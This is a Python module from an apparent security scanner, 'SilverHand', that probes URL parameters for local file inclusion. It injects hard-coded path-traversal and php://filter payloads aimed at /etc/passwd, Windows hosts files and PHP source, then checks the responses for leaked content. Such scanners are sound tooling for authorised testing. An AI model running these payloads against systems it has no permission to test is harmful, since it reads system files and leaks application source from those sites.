"""
SilverHand LFI Scanner - Local File Inclusion detection module
"""

import requests
from typing import Dict, List, Any

class LFIScanner:
    """Local File Inclusion vulnerability scanner"""
    
    def __init__(self):
        self.lfi_payloads = [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts"
        ]
    
    def scan(self, target: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Scan target for LFI vulnerabilities"""
        
        print(f"[+] Starting LFI scan on {target}")
        
        vulnerabilities = []
        
        # Test URL parameters
        if '?' in target:
            base_url = target.split('?')[0]
            params = target.split('?')[1].split('&') if len(target.split('?')) > 1 else []
            
            for param in params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    
                    for payload in self.lfi_payloads:
                        test_url = f"{base_url}?{param_name}={payload}"
                        
                        try:
                            response = requests.get(test_url, timeout=10)
                            
                            if self._detect_lfi(response.text, payload):
                                vulnerabilities.append({
                                    'type': 'lfi',
                                    'severity': 'high',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'description': f'LFI vulnerability in parameter {param_name}',
                                    'recommendation': 'Validate file paths and use whitelisting',
                                    'proof': payload
                                })
                                break
                                
                        except Exception as e:
                            print(f"[-] Error testing LFI: {e}")
        
        return {
            'vulnerabilities': vulnerabilities,
            'total_found': len(vulnerabilities),
            'scan_type': 'lfi',
            'target': target
        }
    
    def _detect_lfi(self, response_text: str, payload: str) -> bool:
        """Detect successful LFI"""
        # Check for common file content
        if "root:" in response_text or "Administrator" in response_text:
            return True
        
        # Check for base64 encoded content (PHP filter)
        if "PD9w" in response_text:  # Base64 encoded PHP
            return True
        
        # Check for Windows hosts file
        if "localhost" in response_text and "127.0.0.1" in response_text:
            return True
        
        return False